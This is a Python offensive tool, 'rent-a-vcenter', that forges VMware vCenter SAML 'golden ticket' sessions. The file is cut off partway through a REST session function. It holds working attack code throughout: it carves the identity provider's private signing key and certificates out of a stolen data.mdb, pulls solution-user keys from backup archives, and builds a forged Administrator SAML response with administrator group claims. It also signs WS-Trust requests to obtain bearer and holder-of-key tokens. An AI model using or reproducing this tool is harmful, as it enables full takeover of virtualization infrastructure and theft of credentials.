#!/usr/bin/env python3
"""rent-a-vcenter — vCenter SAML golden ticket: session cookie, VM memory dump, credential extraction."""

import argparse
import base64
import hashlib
import mmap
import os
import re
import shutil
import socket
import ssl
import subprocess
import sys
import tarfile
import tempfile
import threading
import time
import urllib.parse
import warnings
import zlib
from datetime import datetime, timezone, timedelta
from pathlib import Path

warnings.filterwarnings('ignore', category=DeprecationWarning)


def _need(pkg, pip_name=None, attr=None):
    try:
        import importlib
        mod = importlib.import_module(pkg)
        return getattr(mod, attr) if attr else mod
    except ImportError:
        sys.exit(f'[-] Missing dependency: pip install {pip_name or pkg}')


# ─── SAML template (for UI endpoint: /ui/saml/websso/sso) ─────────────────────

SAML_TEMPLATE = r"""<?xml version="1.0" encoding="UTF-8"?>
<saml2p:Response xmlns:saml2p="urn:oasis:names:tc:SAML:2.0:protocol"
    Destination="https://$VCENTER_IP/ui/saml/websso/sso"
    ID="_eec012f2ebbc1f420f3dd0961b7f4eea"
    InResponseTo="$ID"
    IssueInstant="$ISSUEINSTANT"
    Version="2.0">
  <saml2:Issuer xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
      >https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
  <saml2p:Status>
    <saml2p:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    <saml2p:StatusMessage>Request successful</saml2p:StatusMessage>
  </saml2p:Status>
  <saml2:Assertion xmlns:saml2="urn:oasis:names:tc:SAML:2.0:assertion"
      xmlns:xsd="http://www.w3.org/2001/XMLSchema"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      ID="_91c01d7c-5297-4e53-9763-5ef482cb6184"
      IssueInstant="$ISSUEINSTANT"
      Version="2.0">
    <saml2:Issuer Format="urn:oasis:names:tc:SAML:2.0:nameid-format:entity"
        >https://$VCENTER/websso/SAML2/Metadata/$DOMAIN</saml2:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#" Id="placeholder"/>
    <saml2:Subject>
      <saml2:NameID Format="http://schemas.xmlsoap.org/claims/UPN"
          >Administrator@$DOMAIN_UPPER</saml2:NameID>
      <saml2:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
        <saml2:SubjectConfirmationData
            InResponseTo="$ID"
            NotOnOrAfter="$NOT_AFTER"
            Recipient="https://$VCENTER/ui/saml/websso/sso"/>
      </saml2:SubjectConfirmation>
    </saml2:Subject>
    <saml2:Conditions NotBefore="$NOT_BEFORE" NotOnOrAfter="$NOT_AFTER">
      <saml2:ProxyRestriction Count="10"/>
      <saml2:Condition xmlns:rsa="http://www.rsa.com/names/2009/12/std-ext/SAML2.0" Count="10" xsi:type="rsa:RenewRestrictionType"/>
      <saml2:AudienceRestriction>
        <saml2:Audience>https://$VCENTER/ui/saml/websso/metadata</saml2:Audience>
      </saml2:AudienceRestriction>
    </saml2:Conditions>
    <saml2:AuthnStatement AuthnInstant="$ISSUEINSTANT"
        SessionIndex="_50082907a3b0a5fd4f0b6ea5299cf2ea"
        SessionNotOnOrAfter="$NOT_AFTER">
      <saml2:AuthnContext>
        <saml2:AuthnContextClassRef
            >urn:oasis:names:tc:SAML:2.0:ac:classes:PasswordProtectedTransport</saml2:AuthnContextClassRef>
      </saml2:AuthnContext>
    </saml2:AuthnStatement>
    <saml2:AttributeStatement>
      <saml2:Attribute FriendlyName="userPrincipalName"
          Name="http://schemas.xmlsoap.org/claims/UPN"
          NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator@$DOMAIN_UPPER</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="Groups"
          Name="http://rsa.com/schemas/attr-names/2009/01/GroupIdentity"
          NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Users</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\CAAdmins</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\ComponentManager.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.BashShellAdministrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\SystemConfiguration.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\LicenseService.Administrators</saml2:AttributeValue>
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN\Everyone</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="Subject Type"
          Name="http://vmware.com/schemas/attr-names/2011/07/isSolution"
          NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">false</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="givenName"
          Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/givenname"
          NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">Administrator</saml2:AttributeValue>
      </saml2:Attribute>
      <saml2:Attribute FriendlyName="surname"
          Name="http://schemas.xmlsoap.org/ws/2005/05/identity/claims/surname"
          NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:uri">
        <saml2:AttributeValue xsi:type="xsd:string">$DOMAIN</saml2:AttributeValue>
      </saml2:Attribute>
    </saml2:AttributeStatement>
  </saml2:Assertion>
</saml2p:Response>"""


# ─── MmapStream ────────────────────────────────────────────────────────────────
# Fast mmap-backed replacement for bitstring.ConstBitStream.
# All positions are in BITS (matching the bitstring API) but every operation
# is byte-aligned so mmap.find() runs in C.

class MmapStream:
    def __init__(self, mm):
        self._mm = mm
        self._byte_pos = 0

    @property
    def pos(self):
        return self._byte_pos * 8

    @pos.setter
    def pos(self, bit_pos):
        self._byte_pos = bit_pos // 8

    def findall(self, pattern, bytealigned=True):
        if isinstance(pattern, str):
            pattern = bytes.fromhex(pattern.replace('0x', '').replace('0X', ''))
        pos = 0
        while True:
            idx = self._mm.find(pattern, pos)
            if idx == -1:
                break
            yield idx * 8
            pos = idx + 1

    def read(self, fmt):
        if fmt.startswith('bytes:'):
            n = int(fmt[6:])
        else:
            raise ValueError(f'Unsupported MmapStream format: {fmt!r}')
        data = self._mm[self._byte_pos:self._byte_pos + n]
        self._byte_pos += n
        return data

    def readto(self, pattern, bytealigned=True):
        if isinstance(pattern, str):
            pat = bytes.fromhex(pattern.replace('0x', '').replace('0X', ''))
        else:
            pat = pattern
        idx = self._mm.find(pat, self._byte_pos)
        if idx == -1:
            raise ValueError(f'Pattern {pattern!r} not found')
        end = idx + len(pat)
        data = self._mm[self._byte_pos:end]
        self._byte_pos = end
        return data


# ─── Certificate / key extraction from data.mdb ────────────────────────────────

# AlgorithmIdentifier SEQUENCE for rsaEncryption OID, constant across all RSA key sizes.
# In a PKCS#8 PrivateKeyInfo this always starts at byte offset +7 from the outer SEQUENCE:
#   [+0]  30 82 XX XX  = outer SEQUENCE (variable length)
#   [+4]  02 01 00     = version = 0
#   [+7]  30 0d 06 09 2a 86 48 86 f7 0d 01 01 01 05 00  ← this pattern
# LMDB stores a 4-byte record header immediately before the PKCS#8 DER:
#   00 01 [total_high] [total_low]  (total = full DER byte count including the 30 82 header)
_IDP_CERT_FLAG = b'\x30\x0d\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x01\x05\x00'
_IDP_CERT_FLAG_OFFSET = 7   # bytes from PKCS#8 SEQUENCE start to _IDP_CERT_FLAG
_CERT1_FLAG_UC = b'CN=TrustedCertChain-1,CN=TrustedCertificateChains,'
_CERT1_FLAG_LC = b'cn=TrustedCertChain-1,cn=TrustedCertificateChains,'
_CERT2_FLAG    = b'\x01\x00\x12TrustedCertChain-1'
_NOT_IT        = [b'Engineering', b'California', b'object']


def _pem(der: bytes, kind='CERTIFICATE') -> str:
    b64 = base64.encodebytes(der).decode().rstrip()
    return f'-----BEGIN {kind}-----\n{b64}\n-----END {kind}-----'


def _valid_pem(pem: str) -> bool:
    lines = pem.splitlines()
    return len(lines) > 2 and lines[1].startswith('MI')


def _load_der_cert(raw: bytes) -> bool:
    try:
        crypto = _need('OpenSSL.crypto', 'pyOpenSSL')
        crypto.load_certificate(crypto.FILETYPE_ASN1, raw)
        return True
    except Exception:
        return False


def extract_idp_key(stream: MmapStream, verbose=False) -> str:
    for bit_pos in stream.findall(_IDP_CERT_FLAG):
        # Compute byte offsets relative to the found AlgorithmIdentifier pattern:
        #   PKCS#8 SEQUENCE starts _IDP_CERT_FLAG_OFFSET bytes before the pattern
        #   LMDB record header (4 bytes: \x00\x01 total_high total_low) is 4 bytes before SEQUENCE
        pkcs8_bit = bit_pos - _IDP_CERT_FLAG_OFFSET * 8
        lmdb_bit  = pkcs8_bit - 4 * 8

        stream.pos = lmdb_bit
        marker = stream.read('bytes:2')
        if marker != b'\x00\x01':
            continue

        total_high = stream.read('bytes:1')[0]
        total_low  = stream.read('bytes:1')[0]
        total_size = (total_high << 8) | total_low

        # Sanity: RSA PKCS#8 for 1024–8192-bit keys spans ~640–4100 bytes
        if not (640 <= total_size <= 4200):
            continue

        key_bytes = stream.read(f'bytes:{total_size}')
        if len(key_bytes) != total_size:
            continue
        if key_bytes[:2] != b'\x30\x82':
            continue
        if any(bad in key_bytes for bad in _NOT_IT):
            continue
        pem = _pem(key_bytes, 'PRIVATE KEY')
        if not _valid_pem(pem):
            continue
        return pem
    sys.exit('[-] IdP signing key not found in data.mdb')


def _parse_domain_from_cn(cn: str) -> str:
    parts = [p[3:] for p in cn.split(',') if p.strip().lower().startswith('dc=')]
    domain = '.'.join(parts).strip()
    return ''.join(c for c in domain if c.isprintable())


def extract_cert1(stream: MmapStream, verbose=False):
    flags = list(stream.findall(_CERT1_FLAG_UC)) or list(stream.findall(_CERT1_FLAG_LC))
    if not flags:
        sys.exit('[-] TrustedCertChain-1 marker not found in data.mdb')

    for bit_pos in flags:
        stream.pos = bit_pos
        try:
            cn_end = stream.readto('0x000013')
        except ValueError:
            continue
        cn_end_pos = stream.pos
        stream.pos = bit_pos
        cn_len = (cn_end_pos - bit_pos - 8) // 8
        cn = stream.read(f'bytes:{cn_len}').decode(errors='replace')
        domain = _parse_domain_from_cn(cn)
        if not domain:
            continue
        if verbose:
            print(f'[v] Domain: {domain}  CN: {cn}')

        stream.readto('0x0002')
        size = int(stream.read('bytes:2').hex(), 16)
        cert_bytes = stream.read(f'bytes:{size}')
        if b'ssoserverSign' not in cert_bytes:
            continue
        pem = _pem(cert_bytes)
        if not _valid_pem(pem):
            continue
        return pem, domain

    sys.exit('[-] Could not extract ssoserverSign cert from data.mdb')


def extract_cert2(stream: MmapStream, verbose=False) -> str:
    mm = stream._mm
    # Build search windows: current stream pos (right after cert1) + 10KB before each marker
    search_starts = [stream._byte_pos]
    for m_bits in stream.findall(_CERT2_FLAG):
        s = m_bits // 8 - 10240
        if s >= 0:
            search_starts.append(s)

    for start in search_starts:
        pos = start
        limit = start + 256 * 1024
        while pos < min(limit, len(mm) - 4):
            idx = mm.find(b'\x30\x82', pos)
            if idx == -1 or idx >= limit:
                break
            total = 4 + (mm[idx + 2] << 8 | mm[idx + 3])
            if not 400 <= total <= 4096:
                pos = idx + 1
                continue
            cert_bytes = mm[idx:idx + total]
            if b'ssoserverSign' in cert_bytes:
                pos = idx + 1
                continue
            if not _load_der_cert(cert_bytes):
                pos = idx + 1
                continue
            pem = _pem(cert_bytes)
            if not _valid_pem(pem):
                pos = idx + 1
                continue
            return pem

    return None


def certs_from_mdb(mdb_path: Path, verbose=False):
    """Open data.mdb and return (idp_key_pem, cert1_pem, cert2_pem, domain)."""
    with open(mdb_path, 'rb') as fh:
        mm = mmap.mmap(fh.fileno(), 0, access=mmap.ACCESS_READ)
        stream = MmapStream(mm)
        key_pem   = extract_idp_key(stream, verbose)
        cert1_pem, domain = extract_cert1(stream, verbose)
        cert2_pem = extract_cert2(stream, verbose)
        mm.close()
    return key_pem, cert1_pem, cert2_pem, domain


def extract_vcenter_fqdn_from_mdb(mdb_path: Path) -> str:
    try:
        with open(mdb_path, 'rb') as fh:
            mm = mmap.mmap(fh.fileno(), 0, access=mmap.ACCESS_READ)
            data = bytes(mm)
            mm.close()
        idx = data.find(b'/sts/STSService/')
        if idx > 20:
            # Walk backwards to find 'https://'
            start = data.rfind(b'https://', max(0, idx - 120), idx)
            if start >= 0:
                raw = data[start:idx + 80]
                url = raw.split(b'\x00')[0].split(b'\t')[0]
                m = re.search(rb'https://([A-Za-z0-9._-]+)/sts/STSService/', url)
                if m:
                    return m.group(1).decode()
    except Exception:
        pass
    return ''


def check_signing_cert_staleness(target: str, cert1_pem: str) -> bool:
    try:
        import requests as _req
        from cryptography.x509 import load_pem_x509_certificate, load_der_x509_certificate
        from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
        import base64 as _b64
        from lxml import etree as _ET

        local = load_pem_x509_certificate(cert1_pem.encode())
        local_pk = local.public_key().public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)

        r = _req.get(f'https://{target}/websso/SAML2/Metadata/vsphere.local',
                     verify=False, timeout=8)
        if r.status_code != 200:
            return False

        root = _ET.fromstring(r.content)
        ns = {'md': 'urn:oasis:names:tc:SAML:2.0:metadata',
              'ds': 'http://www.w3.org/2000/09/xmldsig#'}
        for kd in root.findall('.//md:KeyDescriptor[@use="signing"]', ns):
            b64 = kd.findtext('.//ds:X509Certificate', namespaces=ns)
            if b64:
                der = _b64.b64decode(b64.strip())
                live = load_der_x509_certificate(der)
                live_pk = live.public_key().public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)
                if live_pk != local_pk:
                    return True  # cert has been rotated
        return False
    except Exception:
        return False


# ─── Solution user credential extraction ───────────────────────────────────────

_SOL_KEY_PATH  = 'etc/vmware-vpx/ssl/vcsoluser.key'
_SOL_CERT_PATH = 'etc/vmware-vpx/ssl/vcsoluser.crt'


def _try_extract_sol_creds(arc_path: Path):
    """Try to pull vcsoluser key+cert from a single tar.gz. Returns (key, cert) PEM or (None, None)."""
    try:
        with tarfile.open(arc_path) as tf:
            # Normalize member names: strip leading './' so both './etc/...' and 'etc/...' match
            members = {m.name.lstrip('./'): m for m in tf.getmembers()}
            key_m  = members.get(_SOL_KEY_PATH)
            cert_m = members.get(_SOL_CERT_PATH)
            if key_m and cert_m:
                key_pem  = tf.extractfile(key_m).read().decode()
                cert_pem = tf.extractfile(cert_m).read().decode()
                return key_pem, cert_pem
    except Exception:
        pass
    return None, None


def resolve_solution_creds(paths: list, verbose=False):
    """
    Search for vcsoluser.key and vcsoluser.crt in:
      1. Loose files alongside data.mdb (backup-current/ style layout)
      2. config_files.tar.gz or other archives in the same directories
    Returns (key_pem, cert_pem) or (None, None).
    """
    dirs_checked = set()
    for p in paths:
        d = p.parent if p.is_file() else p
        if d in dirs_checked:
            continue
        dirs_checked.add(d)
        key_f  = d / 'vcsoluser.key'
        cert_f = d / 'vcsoluser.crt'
        if key_f.exists() and cert_f.exists():
            key_pem  = key_f.read_text()
            cert_pem = cert_f.read_text()
            return key_pem, cert_pem

    for p in paths:
        if p.suffix not in ('.gz', '.tgz'):
            continue
        key_pem, cert_pem = _try_extract_sol_creds(p)
        if key_pem:
            return key_pem, cert_pem

    return None, None


def _cert_subject_cn(cert_pem: str) -> str:
    try:
        from cryptography.x509 import load_pem_x509_certificate
        cert = load_pem_x509_certificate(cert_pem.encode())
        return cert.subject.rfc4514_string()
    except Exception:
        return '(unknown)'


# ─── WS-Trust / STS solution user authentication ───────────────────────────────

_WSS_SECEXT  = 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd'
_WSS_UTILITY = 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd'
_DS_NS       = 'http://www.w3.org/2000/09/xmldsig#'
_WST_NS      = 'http://docs.oasis-open.org/ws-sx/ws-trust/200512'
_SOAP_NS     = 'http://schemas.xmlsoap.org/soap/envelope/'
_VIM_NS      = 'urn:vim25'

_X509_ENC    = 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-soap-message-security-1.0#Base64Binary'
_X509_VTYPE  = 'http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-x509-token-profile-1.0#X509v3'


def _exc_c14n(elem) -> bytes:
    """Exclusive C14N of an lxml element."""
    etree = _need('lxml.etree', 'lxml')
    return etree.tostring(elem, method='c14n', exclusive=True, with_comments=False)


def _sha256_b64(data: bytes) -> str:
    return base64.b64encode(hashlib.sha256(data).digest()).decode()


def _build_wstrust_envelope(key_pem: str, cert_pem: str, domain: str) -> bytes:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as _pad
    from cryptography.x509 import load_pem_x509_certificate
    etree = _need('lxml.etree', 'lxml')

    now         = datetime.now(timezone.utc)
    ts_created  = now.strftime('%Y-%m-%dT%H:%M:%SZ')
    ts_expires  = (now + timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ')
    tok_expires = (now + timedelta(hours=24)).strftime('%Y-%m-%dT%H:%M:%SZ')

    cert_obj     = load_pem_x509_certificate(cert_pem.encode())
    cert_der_b64 = base64.b64encode(
        cert_obj.public_bytes(serialization.Encoding.DER)).decode()

    # Build envelope with Timestamp + BinarySecurityToken but no Signature yet
    env_xml = (
        f'<soap:Envelope'
        f' xmlns:soap="{_SOAP_NS}"'
        f' xmlns:wsse="{_WSS_SECEXT}"'
        f' xmlns:wsu="{_WSS_UTILITY}"'
        f' xmlns:ds="{_DS_NS}"'
        f' xmlns:wst="{_WST_NS}">'
        f'<soap:Header>'
        f'<wsse:Security soap:mustUnderstand="1">'
        f'<wsu:Timestamp wsu:Id="ts-0">'
        f'<wsu:Created>{ts_created}</wsu:Created>'
        f'<wsu:Expires>{ts_expires}</wsu:Expires>'
        f'</wsu:Timestamp>'
        f'<wsse:BinarySecurityToken'
        f' EncodingType="{_X509_ENC}"'
        f' ValueType="{_X509_VTYPE}"'
        f' wsu:Id="bst-0">{cert_der_b64}</wsse:BinarySecurityToken>'
        f'</wsse:Security>'
        f'</soap:Header>'
        f'<soap:Body wsu:Id="body-0">'
        f'<wst:RequestSecurityToken>'
        f'<wst:TokenType>urn:oasis:names:tc:SAML:2.0:assertion</wst:TokenType>'
        f'<wst:RequestType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue</wst:RequestType>'
        f'<wst:KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Bearer</wst:KeyType>'
        f'<wst:Lifetime>'
        f'<wsu:Created>{ts_created}</wsu:Created>'
        f'<wsu:Expires>{tok_expires}</wsu:Expires>'
        f'</wst:Lifetime>'
        f'<wst:Renewing Allow="false" OK="false"/>'
        f'<wst:Delegatable>true</wst:Delegatable>'
        f'</wst:RequestSecurityToken>'
        f'</soap:Body>'
        f'</soap:Envelope>'
    )

    root      = etree.fromstring(env_xml.encode())
    ts_elem   = root.find(f'.//{{{_WSS_UTILITY}}}Timestamp')
    body_elem = root.find(f'{{{_SOAP_NS}}}Body')

    ts_digest   = _sha256_b64(_exc_c14n(ts_elem))
    body_digest = _sha256_b64(_exc_c14n(body_elem))

    # Build SignedInfo as an XML *string* so lxml parses it with the explicit
    # "ds:" prefix — critical for exc-c14n to produce bytes that the STS can
    # verify.  If we used etree.Element(f'{{{_DS_NS}}}...') lxml would assign
    # an auto-prefix like "ns0:" whose c14n bytes differ from what the STS
    # produces for the same element after parsing the serialized document.
    si_xml = (
        f'<ds:SignedInfo xmlns:ds="{_DS_NS}">'
        f'<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        f'<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
        f'<ds:Reference URI="#ts-0">'
        f'<ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        f'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
        f'<ds:DigestValue>{ts_digest}</ds:DigestValue>'
        f'</ds:Reference>'
        f'<ds:Reference URI="#body-0">'
        f'<ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        f'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
        f'<ds:DigestValue>{body_digest}</ds:DigestValue>'
        f'</ds:Reference>'
        f'</ds:SignedInfo>'
    )
    si      = etree.fromstring(si_xml.encode())
    si_c14n = _exc_c14n(si)
    priv    = serialization.load_pem_private_key(key_pem.encode(), password=None)
    sig_b64 = base64.b64encode(
        priv.sign(si_c14n, _pad.PKCS1v15(), hashes.SHA256())).decode()

    # Build the complete Signature block as a string (same prefix discipline)
    sig_xml = (
        f'<ds:Signature xmlns:ds="{_DS_NS}">'
        + si_xml
        + f'<ds:SignatureValue>{sig_b64}</ds:SignatureValue>'
        f'<ds:KeyInfo>'
        f'<wsse:SecurityTokenReference xmlns:wsse="{_WSS_SECEXT}">'
        f'<wsse:Reference URI="#bst-0" ValueType="{_X509_VTYPE}"/>'
        f'</wsse:SecurityTokenReference>'
        f'</ds:KeyInfo>'
        f'</ds:Signature>'
    )
    sig_elem = etree.fromstring(sig_xml.encode())
    security = root.find(f'.//{{{_WSS_SECEXT}}}Security')
    security.append(sig_elem)

    return etree.tostring(root, xml_declaration=True, encoding='UTF-8')


def sts_issue_bearer_token(target: str, key_pem: str, cert_pem: str,
                            domain: str, verbose=False) -> str:
    """
    Post a WS-Trust Issue request to the STS using the solution user certificate.
    Returns the SAML assertion XML string, or None on failure.
    """
    import requests as req
    req.packages.urllib3.disable_warnings()
    etree = _need('lxml.etree', 'lxml')

    body = _build_wstrust_envelope(key_pem, cert_pem, domain)

    for url in [
        f'https://{target}/sts/STSService/{domain}',
        f'https://{target}/sts/STSService',
    ]:
        try:
            r = req.post(
                url,
                data=body,
                headers={
                    'Content-Type': 'text/xml; charset=UTF-8',
                    'SOAPAction': 'http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue',
                },
                verify=False,
                timeout=20,
            )
            if verbose:
                print(f'[v] STS POST {url} → HTTP {r.status_code}')
            if r.status_code not in (200, 202):
                if verbose:
                    print(f'[v] STS response: {r.text[:500]}')
                continue

            root = etree.fromstring(r.content)
            # The SAML assertion is in RequestSecurityTokenResponse/RequestedSecurityToken
            ns = {'wst': _WST_NS, 'saml2': 'urn:oasis:names:tc:SAML:2.0:assertion'}
            assertion = root.find('.//saml2:Assertion', ns)
            if assertion is None:
                # try without namespace
                assertion = root.find('.//{urn:oasis:names:tc:SAML:2.0:assertion}Assertion')
            if assertion is not None:
                xml_str = etree.tostring(assertion, encoding='unicode')
                if verbose: print('[+] STS issued SAML bearer token')
                return xml_str

            if verbose:
                print(f'[v] STS response (no assertion found): {r.text[:800]}')
        except Exception as e:
            if verbose:
                print(f'[v] STS error ({url}): {e}')

    return None


def _build_wstrust_hok_envelope(key_pem: str, cert_pem: str, domain: str) -> bytes:
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as _pad
    from cryptography.x509 import load_pem_x509_certificate
    etree = _need('lxml.etree', 'lxml')

    now         = datetime.now(timezone.utc)
    ts_created  = now.strftime('%Y-%m-%dT%H:%M:%SZ')
    ts_expires  = (now + timedelta(minutes=5)).strftime('%Y-%m-%dT%H:%M:%SZ')
    tok_expires = (now + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')

    cert_obj     = load_pem_x509_certificate(cert_pem.encode())
    cert_der_b64 = base64.b64encode(
        cert_obj.public_bytes(serialization.Encoding.DER)).decode()

    env_xml = (
        f'<soap:Envelope'
        f' xmlns:soap="{_SOAP_NS}"'
        f' xmlns:wsse="{_WSS_SECEXT}"'
        f' xmlns:wsu="{_WSS_UTILITY}"'
        f' xmlns:ds="{_DS_NS}"'
        f' xmlns:wst="{_WST_NS}">'
        f'<soap:Header>'
        f'<wsse:Security soap:mustUnderstand="1">'
        f'<wsu:Timestamp wsu:Id="ts-0">'
        f'<wsu:Created>{ts_created}</wsu:Created>'
        f'<wsu:Expires>{ts_expires}</wsu:Expires>'
        f'</wsu:Timestamp>'
        f'<wsse:BinarySecurityToken'
        f' EncodingType="{_X509_ENC}"'
        f' ValueType="{_X509_VTYPE}"'
        f' wsu:Id="bst-0">{cert_der_b64}</wsse:BinarySecurityToken>'
        f'</wsse:Security>'
        f'</soap:Header>'
        f'<soap:Body wsu:Id="body-0">'
        f'<wst:RequestSecurityToken>'
        f'<wst:TokenType>urn:oasis:names:tc:SAML:2.0:assertion</wst:TokenType>'
        f'<wst:RequestType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/Issue</wst:RequestType>'
        f'<wst:KeyType>http://docs.oasis-open.org/ws-sx/ws-trust/200512/PublicKey</wst:KeyType>'
        f'<wst:Lifetime>'
        f'<wsu:Created>{ts_created}</wsu:Created>'
        f'<wsu:Expires>{tok_expires}</wsu:Expires>'
        f'</wst:Lifetime>'
        f'<wst:Renewing Allow="false" OK="false"/>'
        f'<wst:Delegatable>true</wst:Delegatable>'
        f'<wst:UseKey Sig="sig-0"/>'
        f'</wst:RequestSecurityToken>'
        f'</soap:Body>'
        f'</soap:Envelope>'
    )

    root      = etree.fromstring(env_xml.encode())
    ts_elem   = root.find(f'.//{{{_WSS_UTILITY}}}Timestamp')
    body_elem = root.find(f'{{{_SOAP_NS}}}Body')

    ts_digest   = _sha256_b64(_exc_c14n(ts_elem))
    body_digest = _sha256_b64(_exc_c14n(body_elem))

    si_xml = (
        f'<ds:SignedInfo xmlns:ds="{_DS_NS}">'
        f'<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        f'<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
        f'<ds:Reference URI="#ts-0">'
        f'<ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        f'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
        f'<ds:DigestValue>{ts_digest}</ds:DigestValue>'
        f'</ds:Reference>'
        f'<ds:Reference URI="#body-0">'
        f'<ds:Transforms><ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        f'<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>'
        f'<ds:DigestValue>{body_digest}</ds:DigestValue>'
        f'</ds:Reference>'
        f'</ds:SignedInfo>'
    )
    si      = etree.fromstring(si_xml.encode())
    si_c14n = _exc_c14n(si)
    priv    = serialization.load_pem_private_key(key_pem.encode(), password=None)
    sig_b64 = base64.b64encode(
        priv.sign(si_c14n, _pad.PKCS1v15(), hashes.SHA256())).decode()

    sig_xml = (
        f'<ds:Signature xmlns:ds="{_DS_NS}" Id="sig-0">'
        + si_xml
        + f'<ds:SignatureValue>{sig_b64}</ds:SignatureValue>'
        f'<ds:KeyInfo>'
        f'<wsse:SecurityTokenReference xmlns:wsse="{_WSS_SECEXT}">'
        f'<wsse:Reference URI="#bst-0" ValueType="{_X509_VTYPE}"/>'
        f'</wsse:SecurityTokenReference>'
        f'</ds:KeyInfo>'
        f'</ds:Signature>'
    )
    sig_elem = etree.fromstring(sig_xml.encode())
    security = root.find(f'.//{{{_WSS_SECEXT}}}Security')
    security.append(sig_elem)

    return etree.tostring(root, xml_declaration=True, encoding='UTF-8')


def sts_issue_hok_token(target: str, key_pem: str, cert_pem: str,
                         domain: str, verbose=False) -> str:
    import requests as req
    req.packages.urllib3.disable_warnings()
    etree = _need('lxml.etree', 'lxml')

    body = _build_wstrust_hok_envelope(key_pem, cert_pem, domain)

    for url in [
        f'https://{target}/sts/STSService/{domain}',
        f'https://{target}/sts/STSService',
    ]:
        try:
            r = req.post(url, data=body,
                          headers={
                              'Content-Type': 'text/xml; charset=UTF-8',
                              'SOAPAction': 'http://docs.oasis-open.org/ws-sx/ws-trust/200512/RST/Issue',
                          },
                          verify=False, timeout=20)
            if verbose:
                print(f'[v] STS HoK POST {url} → HTTP {r.status_code}')
            if r.status_code not in (200, 202):
                continue
            # Extract assertion from RAW bytes to preserve canonical form for
            # the embedded XML signature — re-serializing via lxml breaks it.
            raw = r.content
            start = raw.find(b'<saml2:Assertion ')
            if start == -1:
                start = raw.find(b'<Assertion ')
            if start != -1:
                end = raw.find(b'</saml2:Assertion>', start)
                if end == -1:
                    end = raw.find(b'</Assertion>', start)
                if end != -1:
                    end_tag = b'</saml2:Assertion>' if b'</saml2:Assertion>' in raw[end:end+20] else b'</Assertion>'
                    assertion_bytes = raw[start:end + len(end_tag)]
                    return assertion_bytes.decode('utf-8')
        except Exception as e:
            if verbose:
                print(f'[v] STS HoK error: {e}')

    return None


def acquire_rest_api_token(target: str, key_pem: str, cert_pem: str,
                            domain: str, verbose=False) -> str:
    import requests as req
    from cryptography.hazmat.primitives import hashes, serialization
    from cryptography.hazmat.primitives.asymmetric import padding as _pad
    req.packages.urllib3.disable_warnings()

    r0 = req.post(f'https://{target}/api/session', verify=False, timeout=10)
    if r0.status_code != 401:
        if verbose:
            print(f'[v] REST /api/session unexpected status: {r0.status_code}')
        return None

    www_auth = r0.headers.get('www-authenticate', '')
